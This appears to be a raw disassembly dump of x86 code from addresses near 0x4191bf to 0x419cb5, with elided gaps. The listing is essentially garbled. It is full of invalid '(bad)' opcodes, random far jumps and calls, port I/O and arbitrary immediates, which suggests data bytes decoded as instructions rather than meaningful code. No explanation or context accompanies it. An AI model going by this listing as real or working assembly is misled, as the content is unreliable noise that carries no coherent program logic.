  4191bf:	scas   eax,DWORD PTR es:[edi]
  4191c0:	scas   al,BYTE PTR es:[edi]
  4191c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191c2:	xor    eax,0x1109d23
  4191c7:	add    ch,dh
  4191c9:	add    BYTE PTR [eax],al
  4191cb:	add    bl,dh
  4191cd:	sub    DWORD PTR [esi],esp
  4191cf:	sub    BYTE PTR [ecx],ch
  4191d1:	stos   BYTE PTR es:[edi],al
  4191d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191d3:	inc    edx
  4191d4:	test   BYTE PTR [bp+si],ch
  4191d7:	das    
  4191d8:	add    edx,DWORD PTR [esi]
  4191da:	and    ah,dh
  4191dc:	jne    0x419227
  4191de:	gs xchg dh,al
  4191e1:	mov    ch,0x1a
  4191e3:	dec    ebp
  4191e4:	cmp    ebx,DWORD PTR [ecx-0x7e77409f]
  4191ea:	les    edi,FWORD PTR [edi-0x5b01a191]
  4191f0:	mov    DWORD PTR [eax-0x47],esi
  4191f3:	lds    ebp,FWORD PTR [ebp-0x1c]
  4191f6:	fmulp  st(4),st
  4191f8:	daa    
  4191f9:	int    0x43
  4191fb:	ins    DWORD PTR es:[edi],dx
  4191fc:	outs   dx,BYTE PTR ds:[esi]
  4191fd:	mov    ch,0x76
  4191ff:	push   esi
  419200:	addr16 mov ebp,0x98892511
  419206:	mov    ch,0xc9
  419208:	jbe    0x41921b
  41920a:	lahf   
  41920b:	sub    eax,0x64d24fc8
  419210:	push   ebx
  419211:	xchg   ebx,eax
  419212:	ja     0x41924f
  419214:	dec    ebp
  419215:	fstp   DWORD PTR [esi]
  419217:	enter  0x6c90,0x95
  41921b:	mov    edx,0xac4ca539
  419220:	push   eax
  419221:	jge    0x41925c
  419223:	dec    edx
  419224:	jge    0x41923d
  419226:	mov    cl,0x4e
  419228:	mov    ds:0xa7df9538,eax
  41922d:	or     eax,DWORD PTR [ecx]
  41922f:	mov    bh,0x40
  419231:	out    0xc2,eax
  419233:	out    0x62,eax
  419235:	xor    eax,0x78509352
  41923a:	jecxz  0x419253
  41923c:	rcl    ebp,cl
  41923e:	test   edi,0x83f56b45
  419244:	adc    DWORD PTR [ecx+0x494d2e84],0xa791b6c2
  41924e:	mov    ebx,ebx
  419250:	mov    ah,BYTE PTR ds:0xde5f9cce
  419256:	sub    BYTE PTR [ebx],cl
  419258:	lods   al,BYTE PTR ds:[esi]
  419259:	imul   eax,DWORD PTR [edi-0x73],0x21c030fb
  419260:	mov    cl,0x93
  419262:	mov    ds,WORD PTR [edx-0x29]
  419265:	popf   
  419266:	dec    edi
  419267:	sub    al,0x69
  419269:	sbb    ch,BYTE PTR [eax+0x13b95418]
  41926f:	mov    edx,0x18726446
  419274:	test   BYTE PTR [esi+edx*4],dl
  419277:	jmp    0x419272
  419279:	ret    0xd738
  41927c:	loope  0x419236
  41927e:	jecxz  0x419263
  419280:	test   DWORD PTR [ecx+edi*1-0x5],esi
  419284:	mov    ah,0xcb
  419286:	das    
  419287:	cmp    eax,0x1b2df8da
  41928c:	mov    al,ch
  41928e:	int3   
  41928f:	mov    ds:0x9098b854,al
  419294:	or     eax,0xb673c218
  419299:	aam    0x71
  41929b:	shl    BYTE PTR [ecx],0xe3
  41929e:	lods   eax,DWORD PTR ds:[esi]
  41929f:	out    0x31,al
  4192a1:	shl    DWORD PTR [eax-0x535e3a98],1
  4192a7:	fs mov eax,0xddcb3593
  4192ad:	push   esi
  4192ae:	push   edx
  4192af:	xor    DWORD PTR [eax+0x4a130ca1],esp
  4192b5:	push   ss
  4192b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192b7:	fdivr  DWORD PTR [eax]
  4192b9:	sub    ecx,DWORD PTR [edi-0x668c1de6]
  4192bf:	cld    
  4192c0:	push   ebx
	...
  419331:	add    BYTE PTR [eax],al
  419333:	add    ah,bl
  419335:	mov    bl,0x3f
  419337:	push   eax
  419338:	jg     0x419316
  41933a:	(bad)  
  41933b:	mov    edi,0xbcd03e15
  419340:	lahf   
  419341:	xchg   ebp,eax
  419342:	mov    edx,0x11192a9
  419347:	add    ch,dh
  419349:	add    BYTE PTR [eax],al
  41934b:	add    BYTE PTR [ecx],ch
  41934d:	cdq    
  41934e:	jnp    0x4192ff
  419350:	(bad)  
  419351:	loope  0x4193c0
  419353:	sub    bh,al
  419355:	stos   BYTE PTR es:[edi],al
  419356:	stos   BYTE PTR es:[edi],al
  419357:	sub    eax,0x7d1733
  41935c:	in     eax,dx
  41935d:	sub    eax,0xf8a02050
  419362:	loope  0x419357
  419364:	pop    eax
  419365:	sti    
  419366:	ror    ecx,cl
  419368:	push   cs
  419369:	push   ecx
  41936a:	cmc    
  41936b:	xor    bh,BYTE PTR [eax]
  41936d:	imul   ebx,DWORD PTR [edx-0x16],0xaa826a71
  419374:	adc    BYTE PTR [eax+0x6e9388f2],0x4a
  41937b:	add    bh,BYTE PTR [ebp*8+0x79c8e3bd]
  419382:	pop    edi
  419383:	les    ebx,FWORD PTR [ebp-0x1c]
  419386:	cmp    al,0x19
  419388:	mov    al,0x21
  41938a:	cmpps  xmm1,xmm1,0x19
  41938e:	xchg   ecx,eax
  41938f:	int    0x32
  419391:	aaa    
  419392:	mov    ds:0xbc354c8f,eax
  419397:	std    
  419398:	and    al,0x92
  41939a:	imul   edi,DWORD PTR [edx-0x80],0xd7611030
  4193a1:	xchg   edx,eax
  4193a2:	popa   
  4193a3:	dec    edx
  4193a4:	fist   WORD PTR [esi]
  4193a6:	push   ebx
  4193a7:	ror    al,0xd8
  4193aa:	or     edx,DWORD PTR [edx+esi*8]
  4193ad:	xor    cl,ch
  4193af:	sbb    eax,0xe39d8301
  4193b4:	ins    BYTE PTR es:[edi],dx
  4193b5:	jp     0xabaead12
  4193bb:	push   ebx
  4193bc:	pusha  
  4193bd:	in     eax,0x73
  4193bf:	lahf   
  4193c0:	add    eax,0x2d8c5705
  4193c5:	je     0x41937c
  4193c7:	inc    ecx
  4193c8:	xor    eax,0x8aa42798
  4193cd:	jae    0x615615b3
  4193d3:	sbb    ecx,DWORD PTR ds:0xdefad83d
  4193d9:	movd   DWORD PTR [esi],mm0
  4193dc:	and    ebp,DWORD PTR [ebx-0x19]
  4193df:	nop
  4193e0:	add    DWORD PTR [eax],esp
  4193e2:	inc    esi
  4193e3:	ret    0xad17
  4193e6:	(bad)  
  4193e7:	jge    0x419435
  4193e9:	in     eax,dx
  4193ea:	outs   dx,DWORD PTR ds:[esi]
  4193eb:	cmp    cl,dl
  4193ed:	mov    dl,0x32
  4193ef:	ss jno 0x41944a
  4193f2:	xchg   ebp,eax
  4193f3:	stos   BYTE PTR es:[edi],al
  4193f4:	lock (bad) 
  4193f6:	cmp    BYTE PTR ss:[ebx+0x34],dh
  4193fa:	gs es push ds
  4193fd:	retf   
  4193fe:	(bad)  
  4193ff:	fcomp  DWORD PTR [edx]
  419401:	test   DWORD PTR [esi+ecx*4],esp
  419404:	outs   dx,BYTE PTR ds:[esi]
  419405:	ins    BYTE PTR es:[edi],dx
  419406:	sbb    DWORD PTR [ebx+0xd],ebp
  419409:	sub    dl,al
  41940b:	nop
  41940c:	hlt    
  41940d:	push   eax
  41940e:	ja     0x419449
  419410:	pop    ebp
  419411:	ror    BYTE PTR [eax+0x5237ddb5],0x61
  419418:	call   0x5816cf47
  41941d:	mov    ah,0xad
  41941f:	retf   0x7b7b
  419422:	xchg   BYTE PTR [ebx],dh
  419424:	or     eax,0x3816ad3e
  419429:	jmp    0x419410
  41942b:	loopne 0x419485
  41942d:	mov    bl,BYTE PTR [eax]
  41942f:	mov    ds:0xaf38c6ba,eax
  419434:	sub    ecx,DWORD PTR [edi+0x1d]
  419437:	jmp    0x6e8f:0x936df743
  41943e:	stos   DWORD PTR es:[edi],eax
  41943f:	or     al,0xc
	...
  4194b1:	add    BYTE PTR [eax],al
  4194b3:	add    BYTE PTR [ecx-0x7],al
  4194b6:	mov    ebx,ebx
  4194b8:	mov    ebx,0x95fb51fb
  4194bd:	fidivr WORD PTR [ebx+0x2c]
  4194c0:	sbb    cl,BYTE PTR [ecx+0x128796c8]
  4194c6:	add    DWORD PTR [eax],eax
  4194c8:	cmc    
  4194c9:	add    BYTE PTR [eax],al
  4194cb:	add    cl,ch
  4194cd:	std    
  4194ce:	jne    0x4194fb
  4194d0:	add    eax,0xbc827078
  4194d5:	inc    ecx
  4194d6:	push   cs
  4194d7:	sahf   
  4194d8:	mov    DWORD PTR [esi],eax
  4194da:	pop    edx
  4194db:	jne    0x41946a
  4194dd:	dec    esp
  4194de:	or     al,0x39
  4194e0:	sbb    DWORD PTR [ebp+0x526cbb76],eax
  4194e6:	xchg   esp,eax
  4194e7:	or     cl,BYTE PTR [ebx+0x6e]
  4194ea:	fwait
  4194eb:	hlt    
  4194ec:	stc    
  4194ed:	sbb    BYTE PTR [eax-0x4ea6f4bc],cl
  4194f3:	sar    BYTE PTR [ebp+0x52],1
  4194f6:	call   0xbce581de
  4194fb:	sbb    ah,bl
  4194fd:	pop    ecx
  4194fe:	jl     0x4194f7
  419500:	int3   
  419501:	iret   
  419502:	jecxz  0x41952f
  419504:	das    
  419505:	mov    ebp,0xee51ec77
  41950a:	sahf   
  41950b:	pop    esp
  41950c:	arpl   sp,di
  41950e:	loopne 0x4194a7
  419510:	jl     0x419528
  419512:	pop    ebx
  419513:	mov    ebx,0xe93d73b9
  419518:	dec    edi
  419519:	mov    eax,ds:0x2f182b9
  41951e:	(bad)  
  41951f:	push   esp
  419520:	dec    ecx
  419521:	loopne 0x419587
  419523:	cs es push ebx
  419526:	(bad)  
  419527:	mov    BYTE PTR [edi-0x40a31ee],cl
  41952d:	std    
  41952e:	aad    0x19
  419530:	test   DWORD PTR [esp+eax*8-0x10c59956],ebp
  419537:	call   0x631:0x4211e6b0
  41953e:	inc    esp
  41953f:	lahf   
  419540:	outs   dx,DWORD PTR ds:[esi]
  419541:	lock outs dx,DWORD PTR ds:[esi]
  419543:	adc    BYTE PTR [esi-0x5a],dh
  419546:	inc    ebp
  419547:	push   es
  419548:	mov    eax,ds:0xa1a51a07
  41954d:	lods   al,BYTE PTR ds:[esi]
  41954e:	and    BYTE PTR [ebx-0x58d451d6],dl
  419554:	or     eax,eax
  419556:	push   edi
  419557:	aaa    
  419558:	shl    DWORD PTR [edi+ebx*1],1
  41955b:	xor    esp,DWORD PTR [edi]
  41955d:	dec    ecx
  41955e:	add    al,0x7a
  419560:	dec    esi
  419561:	(bad)  
  419563:	add    ah,BYTE PTR [esi+0xa814947]
  419569:	cwde   
  41956a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41956b:	jno    0x4195e9
  41956d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41956e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41956f:	push   edi
  419570:	xchg   esi,eax
  419571:	lahf   
  419572:	dec    ebx
  419573:	mov    al,0xe0
  419575:	or     esp,DWORD PTR gs:[edx]
  419578:	fnstcw WORD PTR [esi+0x6a]
  41957b:	push   edx
  41957c:	in     al,0x47
  41957e:	repz mov al,0x68
  419581:	or     al,bh
  419583:	add    eax,DWORD PTR [edx+0x47ac04e3]
  419589:	adc    edx,ebp
  41958b:	inc    edx
  41958c:	mov    ebx,0x5708a60a
  419591:	xor    ebx,DWORD PTR [esi+0x761be5ad]
  419597:	icebp  
  419598:	cmp    BYTE PTR [ebp-0x7b38749c],0x8f
  41959f:	imul   ebx,DWORD PTR [esi+0x646141d0],0xffffffa3
  4195a6:	popa   
  4195a7:	or     dh,BYTE PTR [esi]
  4195a9:	in     al,dx
  4195aa:	mov    WORD PTR [edx+ebx*2],gs
  4195ad:	aas    
  4195ae:	fstp   TBYTE PTR [edx]
  4195b0:	les    edi,FWORD PTR [ecx]
  4195b2:	in     eax,0xe9
  4195b4:	les    esi,FWORD PTR [edi+0x2bbc11d5]
  4195ba:	xchg   BYTE PTR [esi+0x28],cl
  4195bd:	test   BYTE PTR [edx],0x13
  4195c0:	or     eax,DWORD PTR [eax]
	...
  419632:	add    BYTE PTR [eax],al
  419634:	xchg   ebx,eax
  419635:	sub    BYTE PTR [eax-0x604344c4],ah
  41963b:	scas   eax,DWORD PTR es:[edi]
  41963c:	jbe    0x4195eb
  41963e:	or     esp,DWORD PTR [eax+0x718ecc8a]
  419644:	jl     0x419659
  419646:	add    DWORD PTR [eax],eax
  419648:	cmc    
  419649:	add    BYTE PTR [eax],al
  41964b:	add    BYTE PTR [edx],bh
  41964d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41964e:	push   ebx
  41964f:	sub    ecx,DWORD PTR [esi]
  419651:	cld    
  419652:	int3   
  419653:	std    
  419654:	les    esp,FWORD PTR [ebp+0x3]
  419657:	retf   
  419658:	test   ch,ah
  41965a:	test   eax,0x35c3e397
  41965f:	mov    bl,0x38
  419661:	add    DWORD PTR [edx+0x5a],edx
  419664:	psrld  mm3,QWORD PTR [eax+0x14]
  419668:	cmova  ecx,esp
  41966b:	les    esi,FWORD PTR [eax-0x39]
  41966e:	mov    ecx,0xb736c194
  419673:	push   es
  419674:	dec    ebp
  419675:	iret   
  419676:	xchg   edi,eax
  419677:	mov    dh,0x23
  419679:	outs   dx,BYTE PTR ds:[esi]
  41967a:	mov    ?,ebx
  41967c:	push   ds
  41967d:	scas   eax,DWORD PTR es:[edi]
  41967e:	cmp    ebp,0x5a9dfe44
  419684:	cmp    ecx,edx
  419686:	fidivr DWORD PTR [edi-0x34]
  419689:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41968a:	mov    dh,0x84
  41968c:	inc    ebx
  41968d:	mov    ds:0x4cdb62a6,eax
  419692:	fwait
  419693:	call   FWORD PTR [eax]
  419695:	adc    esp,DWORD PTR [esi]
  419697:	adc    BYTE PTR [esi],0x9a
  41969a:	scas   eax,DWORD PTR es:[edi]
  41969b:	dec    ebx
  41969c:	and    BYTE PTR [edi+0x13],dl
  41969f:	scas   al,BYTE PTR es:[edi]
  4196a0:	push   0xd171585a
  4196a5:	sub    eax,0x94936e66
  4196aa:	lea    ebx,[edi+0x67]
  4196ad:	dec    edx
  4196ae:	sub    eax,0x862b0787
  4196b3:	data16 jns 0x4196a9
  4196b6:	(bad)  
  4196b7:	pop    esp
  4196b8:	cmc    
  4196b9:	jae    0x419653
  4196bb:	push   ds
  4196bc:	cmp    DWORD PTR gs:[ecx+0x55f2242a],eax
  4196c3:	sub    BYTE PTR [edi],0xe9
  4196c6:	pop    edx
  4196c7:	mov    ebp,DWORD PTR [edx]
  4196c9:	or     ah,dh
  4196cb:	sub    DWORD PTR [edi+eax*1-0x67],eax
  4196cf:	nop
  4196d0:	leave  
  4196d1:	xchg   ecx,eax
  4196d2:	shl    DWORD PTR [esp+edi*2+0x271f090c],0x37
  4196da:	rol    DWORD PTR [ebp-0x2198b41f],1
  4196e0:	sub    esp,DWORD PTR [ecx+0x7a]
  4196e3:	cs in  eax,0x74
  4196e6:	xchg   ecx,eax
  4196e7:	inc    edi
  4196e8:	mov    ebp,0xcf7cd0d7
  4196ed:	push   ss
  4196ee:	sti    
  4196ef:	mov    ds:0xfa62b89,eax
  4196f4:	xchg   edi,eax
  4196f5:	and    al,0x85
  4196f7:	lds    edx,FWORD PTR [edx+ebx*8]
  4196fa:	jae    0x4196bd
  4196fc:	add    al,0xfc
  4196fe:	sbb    edi,ecx
  419700:	pop    ss
  419701:	adc    ebx,eax
  419703:	cld    
  419704:	jmp    0x419780
  419706:	push   esp
  419707:	cli    
  419708:	sbb    DWORD PTR [edi-0x4443c439],ebx
  41970e:	push   ss
  41970f:	mov    al,0x28
  419711:	loopne 0x419787
  419713:	mov    cl,0x88
  419715:	inc    esp
  419716:	retf   
  419717:	and    WORD PTR [esi+0x45336770],sp
  41971e:	mov    eax,0x402e1977
  419723:	scas   al,BYTE PTR es:[edi]
  419724:	sbb    bl,BYTE PTR [edx-0x7cfd80e]
  41972a:	adc    ebx,esi
  41972c:	add    eax,0x73228ed7
  419731:	xor    BYTE PTR [ecx+0x6d],ah
  419734:	mov    bh,dl
  419736:	stos   DWORD PTR es:[edi],eax
  419737:	add    eax,0x1087dbb6
  41973c:	in     al,0x81
  41973e:	mov    ch,0xd2
  419740:	pop    ecx
	...
  4197b1:	add    BYTE PTR [eax],al
  4197b3:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  4197ba:	hlt    
  4197bb:	fist   WORD PTR [ecx+0x7e27cbe9]
  4197c1:	push   edi
  4197c2:	(bad)  
  4197c3:	sbb    al,0x71
  4197c5:	adc    al,0x1
  4197c7:	add    ch,dh
  4197c9:	add    BYTE PTR [eax],al
  4197cb:	add    BYTE PTR [eax+0x2d15e32],cl
  4197d1:	sbb    ah,dh
  4197d3:	push   edi
  4197d4:	or     BYTE PTR [eax],ch
  4197d6:	mov    DWORD PTR [ebp+eax*1-0x73c1b04b],0x7ea67dfd
  4197e1:	dec    ecx
  4197e2:	mov    ebp,0xd69546c5
  4197e7:	pop    esi
  4197e8:	pop    esp
  4197e9:	je     0x419790
  4197eb:	sar    ch,1
  4197ed:	test   BYTE PTR [edx],ah
  4197ef:	push   ds
  4197f0:	jmp    0x4197ed
  4197f2:	(bad)  
  4197f5:	icebp  
  4197f6:	adc    eax,0xee7c0212
  4197fb:	ja     0x4197ba
  4197fd:	dec    eax
  4197fe:	push   esp
  4197ff:	mov    edx,0x886548a6
  419804:	mov    bh,0x11
  419806:	loopne 0x419797
  419808:	(bad)  
  419809:	ret    0xab88
  41980c:	or     edi,0xffffffa3
  41980f:	xor    ebx,DWORD PTR [ebp-0x55a64ccf]
  419815:	mov    cl,0xe6
  419817:	pop    esi
  419818:	enter  0x77c3,0xa3
  41981c:	ds mov ch,0xab
  41981f:	fwait
  419820:	neg    BYTE PTR [eax]
  419822:	jecxz  0x4198a0
  419824:	gs pop esi
  419826:	jle    0x4197aa
  419828:	call   0x1758:0x5ba35ca5
  41982f:	mov    ch,0x41
  419831:	lods   al,BYTE PTR ds:[esi]
  419832:	test   al,0x35
  419834:	pop    edx
  419835:	jmp    0xd5111c7c
  41983a:	sbb    dh,bh
  41983c:	and    edx,DWORD PTR [ebx+0x296a3bdd]
  419842:	test   eax,ebx
  419844:	sub    cl,BYTE PTR [ebx+edx*8+0x1e0b462b]
  41984b:	test   eax,0xb95f594a
  419850:	cld    
  419851:	dec    ebx
  419852:	jno    0x419863
  419854:	(bad)  
  419855:	mov    eax,ds:0x44a91fbb
  41985a:	inc    eax
  41985b:	mov    bh,0x70
  41985d:	adc    ebp,esi
  41985f:	xor    eax,0x38ec6f07
  419864:	mov    al,ds:0x17622cab
  419869:	loop   0x41989a
  41986b:	push   fs
  41986d:	pop    ecx
  41986e:	push   es
  41986f:	xor    ebp,DWORD PTR [ebp-0x5f92299c]
  419875:	adc    edx,ebx
  419877:	sbb    al,BYTE PTR [ebx]
  419879:	(bad)  
  41987b:	add    bl,dh
  41987d:	mov    dh,0xa5
  41987f:	in     eax,dx
  419880:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419881:	adc    bl,BYTE PTR [ebp+0x9f919e4]
  419887:	jne    0x419891
  419889:	xchg   esi,eax
  41988a:	cmp    al,0xda
  41988c:	repz xchg ecx,eax
  41988e:	push   ecx
  41988f:	call   0x9b9d441
  419894:	retf   
  419895:	call   0x22b9:0x816b9096
  41989c:	fwait
  41989d:	push   ds
  41989e:	dec    ebp
  41989f:	out    dx,eax
  4198a0:	addr16 mov eax,0x2ccfcbfc
  4198a6:	imul   edi,DWORD PTR [eax],0xaf65397b
  4198ac:	add    cl,BYTE PTR ds:0x7792456b
  4198b2:	pop    esp
  4198b3:	(bad)  
  4198b5:	scas   eax,DWORD PTR es:[edi]
  4198b6:	sti    
  4198b7:	stos   DWORD PTR es:[edi],eax
  4198b8:	adc    DWORD PTR [ecx-0x3a],esp
  4198bb:	add    DWORD PTR [eax],0xffffff9a
  4198be:	jmp    0x4294d0
	...
  419933:	add    BYTE PTR [ecx+edx*4-0x28a2e9ac],cl
  41993a:	into   
  41993b:	fwait
  41993c:	test   BYTE PTR [ecx-0x28],0x94
  419940:	or     BYTE PTR [esi],0x84
  419943:	lods   al,BYTE PTR ds:[esi]
  419944:	adc    ax,0x1
  419948:	cmc    
  419949:	add    BYTE PTR [eax],al
  41994b:	add    BYTE PTR [eax],dl
  41994d:	ins    DWORD PTR es:[edi],dx
  41994e:	dec    ebx
  41994f:	adc    esi,DWORD PTR [edx]
  419951:	jp     0x419949
  419953:	sti    
  419954:	xor    ecx,ebx
  419956:	das    
  419957:	push   edx
  419958:	mov    esp,0xbff22465
  41995d:	dec    esp
  41995e:	mov    eax,ds:0x8f738fc
  419963:	push   esp
  419964:	push   edi
  419965:	adc    esp,ecx
  419967:	bound  eax,QWORD PTR [edi+0x25]
  41996a:	movaps XMMWORD PTR [ecx],xmm5
  41996d:	push   cs
  41996e:	jmp    0x71d0:0x3ab1
  419974:	mov    ah,0x42
  419976:	fdiv   DWORD PTR [eax-0x5c]
  419979:	mov    eax,ds:0x4c1094ea
  41997e:	xchg   esi,eax
  41997f:	pop    esi
  419980:	rcl    DWORD PTR [ecx+eiz*4+0x3e],1
  419984:	arpl   bp,cx
  419986:	xchg   ecx,eax
  419987:	or     al,0x5
  419989:	lods   al,BYTE PTR ds:[esi]
  41998a:	sub    esp,0x23a15b65
  419990:	sbb    al,BYTE PTR [esi+0x64]
  419993:	fs inc esp
  419995:	pop    ecx
  419996:	int    0x81
  419998:	pop    edi
  419999:	pushf  
  41999a:	xchg   esi,eax
  41999b:	lods   eax,DWORD PTR ds:[esi]
  41999c:	mov    ds:0x22090139,al
  4199a1:	jo     0x419973
  4199a3:	and    esp,DWORD PTR [eax]
  4199a5:	mov    WORD PTR [ecx-0x6f],bx
  4199a9:	mov    WORD PTR [esi-0x50],ss
  4199ac:	cmp    DWORD PTR [ecx+0x52],edi
  4199af:	jmp    0xda247115
  4199b4:	out    dx,al
  4199b5:	fisttp DWORD PTR [edx]
  4199b7:	(bad)  
  4199b8:	pop    esi
  4199b9:	sbb    ebx,DWORD PTR [ebp-0xe]
  4199bc:	out    dx,al
  4199bd:	xor    eax,0x4cf7ddda
  4199c2:	mov    dh,0x11
  4199c4:	inc    ebx
  4199c5:	pop    ss
  4199c6:	fdiv   QWORD PTR [ebx+0x63255200]
  4199cc:	pop    eax
  4199cd:	repnz loope 0x4199ba
  4199d0:	test   al,0x49
  4199d2:	(bad)  
  4199d3:	enter  0x581c,0x5d
  4199d7:	xor    eax,0xd5998e14
  4199dc:	xchg   ebx,eax
  4199dd:	xor    BYTE PTR [eax-0x156e2744],dl
  4199e3:	push   esp
  4199e4:	lahf   
  4199e5:	xchg   BYTE PTR [ecx],al
  4199e7:	add    dl,BYTE PTR [esi+eax*2+0x38]
  4199eb:	mov    bl,0x36
  4199ed:	ja     0x419992
  4199ef:	xchg   ebp,eax
  4199f0:	pop    edi
  4199f1:	(bad)  
  4199f2:	div    BYTE PTR [edi]
  4199f4:	xchg   DWORD PTR [ebp-0x2a],edi
  4199f7:	xlat   BYTE PTR ds:[ebx]
  4199f8:	sub    ebx,DWORD PTR [ebp-0x39aa95d3]
  4199fe:	jno    0x419a4b
  419a00:	xor    eax,DWORD PTR [edi+0x7966a54a]
  419a06:	cmp    eax,0xb2f3e647
  419a0b:	dec    esp
  419a0c:	cmp    DWORD PTR [edi],ebx
  419a0e:	(bad)  [edx+0x38d8a8fc]
  419a14:	sub    dh,BYTE PTR [eax+0x56]
  419a17:	push   edx
  419a19:	add    BYTE PTR [edi],ch
  419a1b:	cmc    
  419a1c:	and    DWORD PTR [edx],ebp
  419a1e:	std    
  419a1f:	dec    esi
  419a20:	jns    0x419a14
  419a22:	pusha  
  419a23:	retf   0xc89b
  419a26:	test   eax,0x3d9b3b79
  419a2b:	push   0x45214a0c
  419a30:	js     0x419a07
  419a32:	daa    
  419a33:	mov    esi,0xc105deec
  419a38:	push   ebx
  419a39:	adc    al,0x7b
  419a3b:	adc    eax,0xd31b7f6a
  419a40:	mov    ch,0x0
	...
  419ab2:	add    BYTE PTR [eax],al
  419ab4:	jl     0x419ac9
  419ab6:	test   DWORD PTR [edx],esi
  419ab8:	out    dx,eax
  419ab9:	mov    dh,0xff
  419abb:	pop    edi
  419abc:	mov    ebp,0xb6357b47
  419ac1:	out    dx,eax
  419ac2:	jecxz  0x419a4f
  419ac4:	pop    ebx
  419ac5:	push   ss
  419ac6:	add    DWORD PTR [eax],eax
  419ac8:	cmc    
  419ac9:	add    BYTE PTR [eax],al
  419acb:	add    BYTE PTR ds:0x4af480e,bh
  419ad1:	sar    dh,0x28
  419ad4:	inc    eax
  419ad5:	imul   ebx,esi,0xa06f747a
  419adb:	dec    esp
  419adc:	imul   esi,DWORD PTR [edx],0xffffffcf
  419adf:	sbb    ecx,DWORD PTR [ebx+0xa]
  419ae2:	arpl   WORD PTR [edx+edi*2-0x19],ax
  419ae6:	arpl   WORD PTR [edx+0x78eb0a41],bp
  419aec:	or     al,0x4a
  419aee:	adc    esi,DWORD PTR ds:0x34e931ea
  419af4:	mov    dl,0x29
  419af6:	dec    esi
  419af7:	das    
  419af8:	rcl    DWORD PTR [esi+0x51fdab5],cl
  419afe:	inc    eax
  419aff:	jmp    0x5381:0xcc3383ec
  419b06:	and    ebp,DWORD PTR [ebx-0x4d]
  419b09:	adc    dh,ah
  419b0b:	imul   esi,esp,0x7f1caf3
  419b11:	rcl    edi,1
  419b13:	mov    edi,0xc6e0352a
  419b18:	mov    esp,0xf0d88f72
  419b1d:	mov    edi,0x9c207993
  419b22:	setno  bl
  419b25:	mov    ebx,0xba1c1edd
  419b2a:	dec    ebp
  419b2b:	push   ecx
  419b2c:	mov    eax,0xc0c58e9e
  419b31:	mov    al,cl
  419b33:	icebp  
  419b34:	add    eax,DWORD PTR ds:0x211aaba3
  419b3a:	(bad)  
  419b3c:	push   eax
  419b3d:	pop    eax
  419b3e:	cli    
  419b3f:	dec    ebx
  419b40:	xchg   ebp,eax
  419b41:	mov    DWORD PTR [ebx-0x72],ebx
  419b44:	jmp    0x419bac
  419b46:	and    edx,DWORD PTR [edx+esi*2-0x5787ce14]
  419b4d:	mov    cs,WORD PTR [ebp-0x1c]
  419b50:	cmp    bh,cl
  419b52:	add    eax,0x2793f433
  419b57:	jb     0x419b20
  419b59:	or     eax,DWORD PTR [esi+0x5c]
  419b5c:	mov    al,ds:0x95efeaa7
  419b61:	pusha  
  419b62:	iret   
  419b63:	xor    ch,BYTE PTR [edx]
  419b65:	xchg   esp,eax
  419b66:	bound  edi,QWORD PTR [edx+0x3a]
  419b69:	cwde   
  419b6a:	cs inc esi
  419b6c:	and    DWORD PTR [ecx+0x79f117c8],esi
  419b72:	fcmovu st,st(7)
  419b74:	js     0x419b83
  419b76:	adc    bh,BYTE PTR [edi]
  419b78:	adc    BYTE PTR [ebp-0x54],0x21
  419b7c:	not    DWORD PTR [edx]
  419b7e:	sbb    DWORD PTR [edx-0x2d],0x52
  419b82:	stos   BYTE PTR es:[edi],al
  419b83:	into   
  419b84:	js     0x419b5e
  419b86:	push   0xb5fdfa9
  419b8b:	and    ah,BYTE PTR [esi+eax*8-0x25]
  419b8f:	adc    DWORD PTR [esp+eax*1-0x57],ebp
  419b93:	or     al,0xee
  419b95:	adc    al,0xca
  419b97:	jmp    0x51d203ba
  419b9c:	adc    BYTE PTR [ebp-0x21781d52],bl
  419ba2:	xor    eax,DWORD PTR [eax-0x7489ce7c]
  419ba8:	mov    ebp,0x2c3e5217
  419bad:	das    
  419bae:	stos   DWORD PTR es:[edi],eax
  419baf:	add    dl,BYTE PTR [ebx+eax*8-0x7186b270]
  419bb6:	cmp    al,0xc2
  419bb8:	call   0xd026:0x91ac14fb
  419bbf:	and    esi,DWORD PTR [edi+0x0]
	...
  419c31:	add    BYTE PTR [eax],al
  419c33:	add    bl,bh
  419c35:	inc    edx
  419c36:	out    dx,al
  419c37:	aas    
  419c38:	(bad)  
  419c39:	mov    edi,0x157c6fb
  419c3e:	sub    esi,0xffffffba
  419c41:	div    ecx
  419c43:	mov    ecx,0x11750
  419c48:	cmc    
  419c49:	add    BYTE PTR [eax],al
  419c4b:	add    al,ah
  419c4d:	sub    eax,ebp
  419c4f:	push   ds
  419c50:	jg     0x419c44
  419c52:	(bad)  
  419c53:	stc    
  419c54:	adc    eax,0x60899361
  419c59:	(bad)  [ebp+0x33]
  419c5c:	inc    esp
  419c5d:	mov    bl,0xe3
  419c5f:	or     BYTE PTR [eax+0x58c0750a],dh
  419c65:	loope  0x419c9f
  419c67:	add    DWORD PTR [eax+0x219c49d9],0xffffffee
  419c6e:	dec    esp
  419c6f:	shld   DWORD PTR [edi-0x71],ebx,cl
  419c73:	(bad)  
  419c74:	cmovns eax,DWORD PTR [eax+edi*2+0x67250e60]
  419c7c:	bound  esp,QWORD PTR ds:0xa1b63d04
  419c82:	iret   
  419c83:	add    eax,0x15c5952d
  419c88:	loope  0x419cff
  419c8a:	mov    ebx,0x6f0aae2f
  419c8f:	mov    ds:0x30ab1b8a,al
  419c94:	das    
  419c95:	pop    edi
  419c96:	sub    esi,DWORD PTR [esi+0x51175f31]
  419c9c:	cs lahf 
  419c9e:	push   cs
  419c9f:	shl    BYTE PTR [eax],0x11
  419ca2:	inc    edi
  419ca3:	rcr    ecx,0x2a
  419ca6:	scas   eax,DWORD PTR es:[edi]
  419ca7:	and    al,0x88
  419ca9:	xchg   ebp,eax
  419caa:	mov    bh,0xea
  419cac:	sbb    al,0xd
  419cae:	add    dh,ch
  419cb0:	test   eax,0x8b4a5c1d
  419cb5:	or     eax,0x5590ee19
